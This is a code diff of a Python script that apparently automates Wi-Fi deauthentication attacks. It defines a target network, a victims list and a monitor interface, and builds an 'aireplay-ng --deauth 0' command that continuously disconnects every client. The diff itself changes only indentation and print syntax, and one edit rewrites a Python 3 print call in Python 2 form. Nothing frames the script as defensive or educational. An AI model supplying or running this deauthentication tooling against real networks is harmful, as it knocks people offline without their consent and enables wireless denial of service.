@@ -4,8 +4,8 @@ import signal
 import sys
 
 #Deauthenticate all clients (You should use aircrack-ng directly):
-network   = "00:00:00:00:00:00"
-victims   = []
+network = "00:00:00:00:00:00"
+victims = []
 
 #Deauthenticate these specific clients:
 #network = "00:00:00:00:00:00"
@@ -19,8 +19,8 @@ victims   = []
 interface = "wlan1mon"
 
 def signal_handler(signal, frame):
-        print('You pressed Ctrl+C!')
-        sys.exit(0)
+    print "\nYou pressed Ctrl+C!"
+    sys.exit(0)
 
 def deauth_all_clients(net):
     command = "aireplay-ng --deauth 0 -a {0} {1}".format(net, interface)
